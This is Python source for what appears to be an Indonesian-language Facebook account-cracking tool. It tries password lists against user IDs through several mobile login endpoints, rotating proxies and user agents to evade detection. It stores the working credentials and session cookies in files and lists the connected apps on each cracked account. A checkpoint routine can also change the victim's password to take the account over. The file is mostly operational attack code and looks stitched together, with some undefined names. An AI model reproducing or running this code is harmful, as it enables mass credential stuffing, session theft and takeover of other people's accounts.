			po = ses.post('https://developers.facebook.com/login/device-based/regular/login/?api_key=793139305026776&auth_token=0b6ec682004f184c19b735a0633758a7&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&refsrc=deprecated&app_id=793139305026776&cancel=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#--------------------[ METODE X ]-----------------#
def colmek1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Mobile{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://x.facebook.com/login.php?skip_api_login=1&api_key=123481471329046&kid_directed_site=0&app_id=123481471329046&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D123481471329046%26state%3D97cgz67n%26redirect_uri%3Dhttps%253A%252F%252Fplogin.jd.id%252Fcgi-bin%252Fmlogin%252Ffacebookcallback%26scope%3Demail%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7da29ea1-31ba-4b07-a30d-9fdafc8bfdd7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fplogin.jd.id%2Fcgi-bin%2Fmlogin%2Ffacebookcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D97cgz67n%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#--------------------[ METODE D ]-----------------#
def colmek2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Mobile{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://d.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://d.facebook.com/login.php?skip_api_login=1&api_key=166363243399924&kid_directed_site=0&app_id=166363243399924&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D166363243399924%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fthirdparty.aliexpress.com%252Ffbcallback.htm%26scope%3Demail%252Cpublic_profile%252Cuser_messenger_contact%26messenger_page_id%3D335963307560%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7720cbb3-6ccb-48be-8820-8775c6c7b67d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"[bold yellow]{idf}|{pw}")
					tree.add(f"[bold yellow]{ua}")
					cetak(tree) 
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"  ")
					tree.add(f"[bold green]{idf}|{pw}")
					tree.add(f"[bold green]{kuki}\n")
					cetak(tree) 
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 12; CPH2089 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s    [+] Opsi CheckPoint :   %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s    [+] Tap Yes / A2F [ Cek Login Di Lite/Mbasic%s ]'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s   [+] %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s    [+] Tidak Dapat Mengecek Opsi [ Cek Login Di Lite/Mbasic ]%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
	
#-----------------------[ DEF CEK OPSI ]--------------------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m [+] "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s%s\33[1;96mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(U,til,O,U,O))
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\33[1;96mMasukan file [ CTH%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s\33[1;91mFile Tidak Ada'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s\33[1;96mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print(" [+] \33[1;96mIsi Yang Benar ");jeda(2)
		back()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s\33[1;96mNama File %s\033[0m Tidak Tersedia"%(M,til,romi))
	jalan("%s%s%s\33[1;96mMode Pesawatkan Terlebih Dahulu 5 Detik "%(U,til,O))
	pw=input("\n%s%s%s\33[1;96mUbah Sandi Pada Akun One Tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s\33[1;96mMasukan Sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s\33[1;91mSandi Minimal 6 Karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print ("%s%s%s\33[1;96mTotal Akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s\33[1;96mLogin Akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s\33[1;96mSelesai Mengecek Akun"%(U,til,O));jeda(0.07)
	input('%s%s%s[%s\33[1;96m Enter%s ]'%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://m.facebook.com"
	session.headers.update({"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\33[1;96m Akun Terkunci Sesi New"%(M,til))
		else:
			print("\r%s%s\33[1;96m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s %s\33[1;96mterdapat %s%s%s \33[1;96mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\33[1;96mAkun One Tab, Sandi Berhasil Di 🥳🥳 \n [+] OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						cek_apk(kuki)
				else:
					print("\r%s%s \33[1;96mAkun One Tab, Silahkan Anda 🥳🥳		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					cek_apk(kuki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s \33[1;91mAkun Terpasang Autentikasi Dua Faktor			"%(M))
			else:
				print("%s%s\33[1;91mTerjadi Kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s \33[1;96mSelamat Akun Anda Tidak Checkpoint Silahkan Masuk Lewat FB🥳🥳 "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s \33[1;96m %s"%(M,oh))
	else:
		print("%s [+] \33[1;91mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(M))
		  
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
